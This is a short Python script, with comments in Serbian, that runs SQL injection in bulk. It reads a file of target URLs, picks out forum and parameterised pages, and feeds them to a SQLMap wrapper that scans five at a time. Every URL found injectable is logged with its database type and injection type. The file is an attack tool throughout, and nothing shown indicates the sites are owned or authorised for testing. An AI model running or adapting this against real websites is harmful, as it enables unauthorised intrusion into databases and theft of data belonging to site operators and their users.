import os
import sys
from queue import Queue
from modules.injector import SQLMapManager

def run_mass_injection():
    validated_file = "data/validated_targets.txt"
    vulnerable_file = "data/vulnerable_targets.txt"
    
    if not os.path.exists(validated_file):
        print(f"[!] Fajl {validated_file} ne postoji.")
        return

    # Učitavanje URL-ova (limitiramo na prvih 50 za test)
    urls = []
    with open(validated_file, "r") as f:
        for line in f:
            url = line.strip()
            if url and url.startswith("http"):
                urls.append(url)
    
    # Prioritizacija foruma i parametarskih URL-ova
    target_urls = [u for u in urls if any(x in u for x in ["forum", "topic", "id=", "tid=", "view"])]
    target_urls = target_urls[:50]
    
    print(f"[*] Izabrano {len(target_urls)} meta za proveru ranjivosti.")

    in_q = Queue()
    out_q = Queue()

    for url in target_urls:
        in_q.put(url)
    in_q.put(None) # Sentinel

    # Pokretanje Injector-a
    print(f"[*] Pokretanje SQLMap injekcije...")
    manager = SQLMapManager(in_q, out_q, max_scans=5) # 5 istovremenih skenova
    
    # Thread za čuvanje rezultata iz out_q
    def saver():
        while True:
            vuln = out_q.get()
            if vuln is None:
                break
            with open(vulnerable_file, "a") as f:
                f.write(f"{vuln['url']} | DBMS: {vuln['dbms']} | Type: {vuln['type']}\n")
    
    import threading
    saver_thread = threading.Thread(target=saver)
    saver_thread.start()

    manager.run()
    saver_thread.join()

    print("[*] Injekcija završena.")

if __name__ == "__main__":
    sys.path.append(os.getcwd())
    run_mass_injection()
